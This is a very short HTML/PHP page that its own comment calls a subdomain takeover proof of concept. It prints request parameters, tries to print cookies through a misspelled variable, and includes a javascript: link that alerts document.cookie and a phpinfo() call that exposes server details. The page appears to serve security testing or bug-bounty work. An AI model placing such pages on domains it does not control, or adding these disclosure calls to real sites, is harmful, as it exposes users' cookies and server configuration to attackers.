<html>
<body>
Silence is golden.
<!-- subdomain takeover PoC by glc -->
<?php var_dump($_GET); ?>
<?php var_dump($_COOKIES); ?>
<a href="javascript:alert(document.cookie);">ccc</a>
<?php phpinfo(); ?>
</body>
<html>
